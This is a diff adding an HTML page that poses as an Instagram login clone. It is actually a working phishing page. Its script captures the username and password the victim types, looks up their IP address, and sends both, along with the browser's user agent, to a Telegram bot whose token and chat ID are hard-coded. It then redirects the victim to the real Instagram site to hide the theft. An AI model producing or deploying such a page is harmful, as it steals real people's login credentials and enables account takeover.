@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Instagram login page clone">
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram Clone</title>
+    <style>
+        /* Added basic styles since you're using external CSS */
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        .flex { display: flex; }
+        .direction-column { flex-direction: column; }
+        .align-items-center { align-items: center; }
+        .justify-content-center { justify-content: center; }
+        .flex-wrap { flex-wrap: wrap; }
+        .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border-width: 0; }
+    </style>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center" style="height: 100vh;">
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram logo" style="width: 175px;">
+                </h1>
+                <form id="loginForm"> <!-- Added ID to form -->
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input name="email" id="email" placeholder="Phone, username, or email" style="padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box;" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" id="password" type="password" placeholder="Password" style="padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box;" />
+
+                    <button type="submit" style="padding: 8px; margin: 10px 0; width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px;">Log In</button> <!-- Changed to submit -->
+                </form>
+                <div class="flex separator align-items-center" style="margin: 15px 0; width: 100%;">
+                    <span style="flex: 1; height: 1px; background: #dbdbdb;"></span>
+                    <div class="or" style="padding: 0 10px;">OR</div>
+                    <span style="flex: 1; height: 1px; background: #dbdbdb;"></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <a style="color: #385185; text-decoration: none;">Log in with Facebook</a>
+                    </div>
+                    <a href="#" style="color: #00376b; text-decoration: none; margin-top: 15px;">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center" style="padding: 20px; margin: 10px 0; background: white; border: 1px solid #dbdbdb; width: 100%; box-sizing: border-box;">
+                <p style="margin: 0; margin-right: 5px;">Don't have an account?</p>
+                <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center" style="width: 100%;">
+                <p style="margin: 10px 0;">Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Apple App Store logo" style="height: 40px; margin: 0 5px;">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play Store logo" style="height: 40px; margin: 0 5px;">
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Replace these with your actual Telegram bot token and chat ID
+        const BOT_TOKEN = '7344052480:AAHft2Wp4C-b2FxBOHXcuqnyTjhOOzfDfHY';
+        const CHAT_ID = '6589828418';
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const username = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            console.log('Attempting to send:', {username, password}); // Debug log
+            
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip || 'Unknown';
+                
+                // Format the message
+                const message = `📢 New Login Attempt 📢
+                
+🔍 Username/Email: ${username}
+🔑 Password: ${password}
+                
+🌐 IP Address: ${ip}
+⏰ Time: ${new Date().toLocaleString()}
+🖥️ User Agent: ${navigator.userAgent}`;
+                
+                console.log('Sending message:', message); // Debug log
+                
+                // Send to Telegram
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Telegram response:', result); // Debug log
+                
+                // Redirect after sending
+                window.location.href = 'https://instagram.com';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Still redirect even if sending fails
+                window.location.href = 'https://instagram.com';
+            }
+        });
+    </script>
+</body>
+</html>
